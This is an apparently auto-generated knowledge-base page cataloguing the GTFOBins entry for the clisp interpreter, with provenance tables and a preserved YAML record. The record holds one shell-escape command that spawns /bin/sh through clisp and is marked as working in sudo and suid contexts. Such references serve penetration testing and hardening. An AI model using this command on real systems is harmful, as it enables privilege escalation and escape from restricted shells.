---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# clisp

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `clisp` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/clisp` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [clisp](../../tools/linux/clisp.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | clisp |
| name | clisp |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/clisp/ |

## Preserved Source Material

```yaml
_body: ''
_name: clisp
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/clisp
functions:
  shell:
  - code: clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
